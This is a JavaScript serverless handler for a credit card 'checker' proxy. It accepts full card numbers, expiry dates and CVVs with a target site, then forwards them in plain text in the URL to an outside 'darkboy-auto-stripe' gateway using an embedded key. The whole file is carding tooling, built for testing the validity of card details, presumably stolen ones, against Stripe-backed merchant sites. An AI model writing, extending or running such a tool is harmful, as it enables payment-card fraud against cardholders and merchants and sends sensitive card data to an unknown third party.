export default async function handler(req, res) {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  // Handle preflight OPTIONS request
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    // Get the request body
    let body;
    if (typeof req.body === 'string') {
      body = JSON.parse(req.body);
    } else {
      body = req.body;
    }

    const { cc, site } = body;

    // Validate required parameters
    if (!cc || !site) {
      return res.status(400).json({ 
        error: 'Missing required parameters: cc and site',
        received: { cc: cc || 'missing', site: site || 'missing' }
      });
    }

    // Validate credit card format
    if (!cc.match(/^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$/)) {
      return res.status(400).json({ 
        error: 'Invalid credit card format. Use: NUMBER|MM|YYYY|CVV',
        received: cc
      });
    }

    console.log('Processing CC:', cc.substring(0, 4) + '****', 'Site:', site);

    // Build API URL
    const apiUrl = `https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=${encodeURIComponent(site)}/cc=${encodeURIComponent(cc)}`;
    
    // Make request to external API
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: {
        'Accept': 'application/json',
        'User-Agent': 'DarkBoy-CC-Checker/2.0 (Vercel Proxy)',
        'Cache-Control': 'no-cache'
      },
      timeout: 30000 // 30 second timeout
    });

    console.log('API Response Status:', response.status);

    // Get response text first
    const responseText = await response.text();
    console.log('API Response:', responseText.substring(0, 200));

    let jsonResult;
    
    // Try to parse as JSON
    try {
      jsonResult = JSON.parse(responseText);
    } catch (parseError) {
      // If not JSON, wrap in a standard format
      jsonResult = {
        status: response.ok ? 'success' : 'error',
        message: responseText.trim(),
        raw_response: responseText,
        json_parse_error: parseError.message
      };
    }

    // Add metadata
    jsonResult.processed_at = new Date().toISOString();
    jsonResult.http_status = response.status;

    // Return with same status code as external API
    return res.status(response.status).json(jsonResult);

  } catch (error) {
    console.error('Proxy Error:', error);
    
    // Handle different types of errors
    if (error.name === 'TypeError' && error.message.includes('fetch')) {
      return res.status(502).json({ 
        error: 'Failed to connect to external API',
        details: error.message 
      });
    }
    
    if (error.name === 'SyntaxError') {
      return res.status(400).json({ 
        error: 'Invalid JSON in request body',
        details: error.message 
      });
    }

    return res.status(500).json({ 
      error: 'Internal server error',
      details: error.message,
      type: error.name
    });
  }
}